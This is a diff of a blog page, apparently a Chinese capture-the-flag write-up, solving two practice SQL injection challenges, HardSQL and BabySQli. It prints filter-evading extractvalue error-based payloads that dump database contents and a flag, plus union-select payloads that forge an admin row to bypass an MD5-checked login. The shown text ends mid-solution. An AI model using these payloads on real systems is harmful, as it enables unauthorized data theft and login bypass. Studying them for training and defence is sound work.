@@ -56,55 +56,55 @@
         </div>
         <div class="content markdown">
             <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>打开容器，发现这是一道sql注入题而且是之前的一道续题</p>
-<h4 id="一-发现注入点："><a href="#一-发现注入点：" class="headerlink" title="一.发现注入点："></a>一.发现注入点：</h4><p>经过测试发现它存在注入点：<code>&#39;</code>，而且注入的位置是在密码栏<img src="/2021/07/15/buuctf7/image-20210718112626887.png" alt="image-20210718112626887"></p>
-<p><img src="/2021/07/15/buuctf7/image-20210718112747724.png" alt="image-20210718112747724"></p>
+<h4 id="一-发现注入点："><a href="#一-发现注入点：" class="headerlink" title="一.发现注入点："></a>一.发现注入点：</h4><p>经过测试发现它存在注入点：<code>&#39;</code>，而且注入的位置是在密码栏<img src="/buuctf7.assets/image-20210718112626887.png" alt="image-20210718112626887"></p>
+<p><img src="/buuctf7.assets/image-20210718112747724.png" alt="image-20210718112747724"></p>
 <h4 id="二-探索注入方式："><a href="#二-探索注入方式：" class="headerlink" title="二.探索注入方式："></a>二.探索注入方式：</h4><p>进过初步的测试我发现过滤了很多关键词，包括：空格，union，and(&amp;)，or(|)等等</p>
 <p>但是我这里发现它没有过滤**异或符(^)**，所以我们可以利用异或符做连接符，然后我们这边可以用括号代替空格（注意这里的替代不是完全替代的意思，我是怎么理解的：用括号把名词组括起来以代替空格，因此这题堆叠注入肯定用不了了，因为show和databases之间要用空格隔开。）所以思来想去可以用报错注入，这样也无需考虑异或判断语句成立的条件。</p>
 <h4 id="三-报错注入开始："><a href="#三-报错注入开始：" class="headerlink" title="三.报错注入开始："></a>三.报错注入开始：</h4><h5 id="1-爆库"><a href="#1-爆库" class="headerlink" title="1.爆库"></a>1.爆库</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,database()))#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/15/buuctf7/image-20210718125452943.png" alt="image-20210718125452943"></p>
+<p><img src="/buuctf7.assets/image-20210718125452943.png" alt="image-20210718125452943"></p>
 <h5 id="2-爆表"><a href="#2-爆表" class="headerlink" title="2.爆表"></a>2.爆表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/15/buuctf7/image-20210718125505104.png" alt="image-20210718125505104"></p>
+<p><img src="/buuctf7.assets/image-20210718125505104.png" alt="image-20210718125505104"></p>
 <h5 id="3-爆列"><a href="#3-爆列" class="headerlink" title="3.爆列"></a>3.爆列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/15/buuctf7/image-20210718125606817.png" alt="image-20210718125606817"></p>
+<p><img src="/buuctf7.assets/image-20210718125606817.png" alt="image-20210718125606817"></p>
 <h5 id="4-爆值"><a href="#4-爆值" class="headerlink" title="4.爆值"></a>4.爆值</h5><p>这边由于报错长度受限，我们可以猜测一下flag应该是在password里，节省一下回显长度</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/15/buuctf7/image-20210718130428916.png" alt="image-20210718130428916"></p>
+<p><img src="/buuctf7.assets/image-20210718130428916.png" alt="image-20210718130428916"></p>
 <p>可以看到还差一点，我们可以试试用left()和right()去截</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))#</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/07/15/buuctf7/image-20210718130606174.png" alt="image-20210718130606174"></p>
+<p><img src="/buuctf7.assets/image-20210718130606174.png" alt="image-20210718130606174"></p>
 <p>最后把flag拼接一下得：flag{0b94076f-db77-46e6-9ea3-34468bd544a0}</p>
 <h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><h4 id="原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"><a href="#原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！" class="headerlink" title="原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！"></a>原题目描述：刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</h4><p>打开容器，发现是一道sql注入题，按照惯例先看源码</p>
 <h4 id="一-发现hint文件"><a href="#一-发现hint文件" class="headerlink" title="一.发现hint文件"></a>一.发现hint文件</h4><p>发现有一个search.php的文件：</p>
-<p><img src="/2021/07/15/buuctf7/image-20210718173529948.png" alt="image-20210718173529948"></p>
+<p><img src="/buuctf7.assets/image-20210718173529948.png" alt="image-20210718173529948"></p>
 <p>刚开始我还以为这是base64，结果解码完是乱码，搜索发现原来是base32。</p>
 <p><strong>注意base32 和 base64 的区别：</strong><br>base32 只有大写字母和数字组成，或者后面有三个等号。<br>base64 只有大、小写字母和数字组成，后面一般是两个等号。</p>
-<p>那么我们把这段话解码：<img src="/2021/07/15/buuctf7/image-20210718173904505.png" alt="image-20210718173904505"></p>
-<p>得到一串base64编码串，再解码：<img src="/2021/07/15/buuctf7/image-20210718173944250.png" alt="image-20210718173944250"></p>
+<p>那么我们把这段话解码：<img src="/buuctf7.assets/image-20210718173904505.png" alt="image-20210718173904505"></p>
+<p>得到一串base64编码串，再解码：<img src="/buuctf7.assets/image-20210718173944250.png" alt="image-20210718173944250"></p>
 <p>发现就是一句普通的sql语句，注入点为<code>&#39;</code></p>
 <h4 id="二-尝试注入"><a href="#二-尝试注入" class="headerlink" title="二.尝试注入"></a>二.尝试注入</h4><p>先试试最常用的union联合注入</p>
 <p><code>username=0&#39; union select 1,2#</code></p>
 <p><code>password=12</code></p>
-<p><img src="/2021/07/15/buuctf7/image-20210718180607767.png" alt="image-20210718180607767"></p>
+<p><img src="/buuctf7.assets/image-20210718180607767.png" alt="image-20210718180607767"></p>
 <p>字段数不一致，username改成<code>0&#39; union select 1,2,3#</code></p>
-<p><img src="/2021/07/15/buuctf7/image-20210718180710189.png" alt="image-20210718180710189"></p>
+<p><img src="/buuctf7.assets/image-20210718180710189.png" alt="image-20210718180710189"></p>
 <p>那么说明user表存在三个列，按照之前的经验就是：id，username，password</p>
 <p>然后我想直接爆库：<code>0&#39; union select 1,2,databases#</code>但是这样会报错，我改成<code>0&#39; union select 1,2,database()#</code>发现它过滤了括号，然后我尝试了报错注入，堆叠注入都不行，然后我就有点懵了，看了wp才发现自己忘记了union联合注入的一个特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据作为单独一行数据值</strong></p>
 <h5 id="举例说明："><a href="#举例说明：" class="headerlink" title="举例说明："></a>举例说明：</h5><p>假设原本user表中只存在一行数据</p>
-<p><img src="/2021/07/15/buuctf7/image-20210718183332270.png" alt="image-20210718183332270"></p>
+<p><img src="/buuctf7.assets/image-20210718183332270.png" alt="image-20210718183332270"></p>
 <p>我们输入查询语句：<code>0&#39; union select 1,&#39;admin&#39;,md5(123)#</code> 后可以看到user表中多了一行</p>
-<p><img src="/2021/07/15/buuctf7/image-20210718183759389.png" alt="image-20210718183759389"></p>
+<p><img src="/buuctf7.assets/image-20210718183759389.png" alt="image-20210718183759389"></p>
 <p>这样一来我们就混淆了admin账号的密码。</p>
 <p>这里还有一点要注意的数据库会先检测我们的username是否存在，然后判断你输入的密码的md5编码和对应用户名的password是否一样。</p>
 <p>因此我们要找一个存在的用户名。</p>
 <p>一般来说数据库中都会有admin这个账号，那我们就来测试一下是否存在：<code>0&#39; union select &#39;admin&#39;,2,3#</code></p>
-<p><img src="/2021/07/15/buuctf7/image-20210718202910736.png" alt="image-20210718202910736"></p>
+<p><img src="/buuctf7.assets/image-20210718202910736.png" alt="image-20210718202910736"></p>
 <p>说明要么不在这一列，要么不存在，换一列试试：<code>0&#39; union select 1,&#39;admin&#39;,3#</code></p>
-<p><img src="/2021/07/15/buuctf7/image-20210718203220570.png" alt="image-20210718203220570"></p>
+<p><img src="/buuctf7.assets/image-20210718203220570.png" alt="image-20210718203220570"></p>
 <p>可以看到账号admin是存在的。那么下面我们就可以正式开始我们的联合注入了</p>
 <h4 id="三-开始注入："><a href="#三-开始注入：" class="headerlink" title="三.开始注入："></a>三.开始注入：</h4><p>构造payload:</p>
 <p>username=0’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#</p>
